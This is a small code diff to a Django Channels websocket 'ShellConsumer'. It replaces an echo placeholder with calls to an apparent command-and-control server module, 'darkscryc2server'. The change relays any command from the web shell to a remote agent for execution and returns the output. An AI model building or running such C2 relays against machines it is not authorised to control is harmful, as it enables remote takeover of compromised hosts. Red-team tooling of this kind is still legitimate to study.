@@ -1,7 +1,8 @@
 # yourapp/consumers.py
 import json
 from channels.generic.websocket import AsyncWebsocketConsumer
-from channels.layers import InMemoryChannelLayer
+from darkscryc2server.Utils.remote_utils.commands import remote_send_command
+from darkscryc2server.Models.ModulesSchemas.Execution import RunCommand
 
 class ShellConsumer(AsyncWebsocketConsumer):
 
@@ -19,8 +20,11 @@ class ShellConsumer(AsyncWebsocketConsumer):
         data = json.loads(data)
         command = data.get("command")
         # Do shell logic or dispatch to a worker, etc.
-        result = f"You sent the command: {command}"
+        result = await remote_send_command(
+            conn_id=self.agent_id,
+            command=RunCommand(command=command).xml()
+        )
         # Echo back:
         await self.send(json.dumps({
-            "message": result
+            "message": result.data
         }))
